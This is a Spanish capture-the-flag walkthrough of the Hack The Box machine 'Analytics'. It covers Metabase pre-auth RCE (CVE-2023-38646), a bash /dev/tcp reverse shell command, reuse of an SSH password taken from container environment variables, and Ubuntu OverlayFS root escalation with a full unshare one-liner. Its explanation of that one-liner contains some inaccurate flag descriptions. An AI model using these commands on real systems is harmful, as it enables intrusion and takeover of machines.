# Analytics
- Comenzamos escaneando el objetivo, los puertos 22 y 80 están expuestos:
~~~ bash 
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV 10.10.11.233
~~~

![[Pasted image 20231102163654.png]]

- Añadimos **10.10.11.233 analytical.htb** a /etc/hosts y podemos ver una pagina por el puerto 80
- Al enumerar la pagina, nos encontramos con un subdominio en http://data.analytical.htb:
![[Pasted image 20231102210211.png]]
- También encontré el [CVE-2023-38646](https://infosecwriteups.com/cve-2023-38646-metabase-pre-auth-rce-866220684396) que según su descripción, permite omitir el login a través de una vulnerabilidad en la api de Metabase
- El CVE nos indica que debemos buscar un **setup-token** en la ruta http://vulnerablehost.com/api/session/properties 
![[Pasted image 20231102210716.png]]
- Perfecto, ahora utilizamos el [PoC del exploit](https://github.com/securezeron/CVE-2023-38646?source=post_page-----bd3421cba76d--------------------------------) creado por securezeron para llevar a cabo la explotación con los parametros requeridos
- Tras probar varias veces, el PoC no me envió una conexión inversa, así que decidí revisar el codigo, y cambiar el payload
![[Pasted image 20231102212953.png]]

- Emplea un reverse shell encodeado en base64, por lo que opté por enviarlo por una solicitud hacia el endpoint ubicado en **/api/setup/validate**, mas en esta parte:
![[Pasted image 20231102214132.png]]
Yo prefiero utilizar 
~~~ bash 
bash -c "bash -i >&/dev/tcp/<ip>/<port 0>&1>"
~~~
![[Pasted image 20231102214548.png]]
- Y estamos dentro :D
![[Pasted image 20231102214616.png]]
- Después de enumerar un poco, podemos descubrir que nos encontramos dentro de un docker:
![[Pasted image 20231102214916.png]]
- Por lo que decido revisar algunas variables de entorno, y encontramos una contraseña, probablemente de ssh:
![[Pasted image 20231102215026.png]]
- Y en efecto que eran de ssh, ahora tenemos una shell mucho mas estable:
  ![[Pasted image 20231102215228.png]]
  - Primera flag :D
  ![[Pasted image 20231102215320.png]]
  

***
<h3>PrivEsc</h3>

- Después de enumerar durante buen rato, me perdí al no encontrar posibles verctores de ataque, hasta que decidí mirar la versión del kernel y del sistema operativo
- ![[Pasted image 20231102220449.png]]
  - Del kernel no encontré nada, pero si encontré un [CVE para la versión de ubuntu](https://github.com/briskets/CVE-2021-3493/blob/main/exploit.c)
  - Dado que es un exploit binario y requiero compilarlo, me di cuenta que la maquina victima no tiene gcc instalado, así que lo compilé en mi maquina y lo compartí por un servidor de python3
  ![[Pasted image 20231102221316.png]]
- Y somos root:
  ![[Pasted image 20231102221631.png]]

**Extra**

- Encontré otros [CVE-2023-2640 & CVE-2023-32629 en un foro de Reddit](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/?rdt=53261) donde se emplea una tecnica alterna para escalar a root a través de la creación de un entorno aislado dentro del equipo, con unshare, con el cual cambia el uid a uno perteneciente a root:

~~~ bash 
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\"id\")'";rm -rf l u w m
~~~~

![[Pasted image 20231102222333.png]]
**1- unshare -rm sh -c "...":**
Este comando utiliza la utilidad unshare para crear un nuevo espacio de nombres <namespace> con opciones -rm. Las opciones significan lo siguiente:
- r: Propaga una jerarquía de directorios nueva (root).
- m: Propaga un punto de montaje nuevo.
- sh -c "...": Ejecuta el shell sh en el nuevo espacio de nombres y ejecuta los comandos contenidos entre las comillas dobles "...".

2- mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3; mount - overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\"bash\")'":

Este comando realiza una serie de operaciones en el nuevo espacio de nombres creado:
- mkdir l u w m: Crea los directorios l, u, w, y m.
- cp /u*/b*/p*3 l/: Copia archivos que coincidan con el patrón /u*/b*/p*3 al directorio l.
- setcap cap_setuid+eip l/python3: Establece capacidades especiales en el archivo l/python3, que permiten la ejecución con capacidades adicionales (en este caso, la capacidad cap_setuid y cap_eip).
- mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m: Monta un sistema de archivos overlay en el directorio m. Esto crea una capa que combina los archivos en l y u, donde l es la capa inferior (lowerdir), u es la capa superior (upperdir), y w es el directorio de trabajo (workdir). Esto permite la modificación de archivos sin afectar la capa inferior.
- touch m/*: Crea archivos vacíos en la capa combinada m.
- u/python3 -c 'import os;os.setuid(0);os.system("id")': Ejecuta el intérprete de Python (python3) que se encuentra en la capa superior u, y en ese intérprete, ejecuta un script que cambia el UID al de root (0) y luego ejecuta el comando bash para crear un entorno interactivo con las propiedades de root.
- rm -rf l u w m: Este comando solo elimina recursivamente los directorios l, u, w, y m
